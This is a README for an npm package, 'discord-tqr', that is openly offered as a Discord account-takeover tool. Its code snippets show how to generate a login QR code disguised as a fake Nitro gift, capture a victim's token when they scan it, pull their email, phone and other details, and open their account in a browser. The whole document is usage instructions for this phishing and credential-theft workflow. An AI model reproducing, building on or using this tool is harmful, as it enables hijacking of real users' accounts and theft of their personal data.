# Discord-tqr v1.0.0

Generate QR code to get user token to take control of the account, get informations ...

## 💻 Installation

```
$ npm i discord-tqr
```

## 📚 Usage

Import

```js
import DiscordTQR from "discord-tqr";
//or
const DiscordTQR = require("discord-tqr").default;
```

API

```js
const handler = new DiscordTQR();
```

## Generate a QR Code

<img src="./assets/qr.png" alt="QR Code" height="200"></img>
<img src="./assets/qr-with-template.png" alt="QR Code" height="200"></img>

options:

- `path?`: string - Path where you want to save the QR code in png format
- `template?`: "default" | { path?: string, x?: number, y?: number, width?: number, height?: number } - If you want to apply a template to the QR code. With "default" you can create a fake nitro gift. You can also make a custom one with `path` for the template image and `x, y, width, height` for the x/y position of the QR code on the template and the width/height for the size of the QR code on the template.
- `browserOptions?`: any - Browser options for puppeter by default it's `{ headless: true }`

```ts
//Generate a QR Code
const buffer = await handler.getQRCode();
const base64 = buffer.toString("base64");
```

## Listening for token

> **_NOTE:_** This method work only if you launch "getQRCode" before

```ts
//Return the token in a string when the QR code is scanned
const token = await handler.listenForToken();
```

## Get user informations

- `token?`: string - The token of the user by default it's the token from `listForToken` method

```ts
//Return json object with user informations like subscription, email, phone, avatar, name ...
const user = await handler.getDiscordAccountInfo(token?: string);
```

## Open user account

options:

- `token?`: string - The token of the user by default it's the token from `listForToken` method
- `browserOptions?`: any - Browser options for puppeter by default it's `{ headless: false, defaultViewport: null, args: ["--start-fullscreen"] }`

```ts
//Open discord account in chromium
await handler.openDiscordAccount(options?: { token?: string, browserOptions?: any });
```

## Close connection

```ts
//Close the browser used for generating the QR Code and for listenForToken
await handler.closeConnection();
```
